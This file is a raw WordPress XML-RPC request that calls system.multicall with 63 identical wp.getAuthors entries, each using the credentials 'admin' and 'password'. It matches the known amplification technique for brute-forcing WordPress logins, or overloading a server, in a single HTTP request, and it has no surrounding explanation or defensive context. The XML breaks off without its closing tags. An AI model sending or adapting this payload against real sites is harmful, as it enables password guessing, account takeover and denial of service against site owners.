<?xml version="1.0"?>
<methodCall>
	<methodName>system.multicall</methodName>
	<params>
		<param>
			<value>
				<array>
					<data>
						<value>
							<!--  0 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<!-- 10 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<!-- 20 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<!-- 30 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<!-- 40 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<!-- 50 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<!-- 60 -->
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
							<struct><member><name>methodName</name><value><string>wp.getAuthors</string></value></member><member><name>params</name><value><array><data><value><string>1</string></value><value><string>admin</string></value><value><string>password</string></value></data></array></value></member></struct>
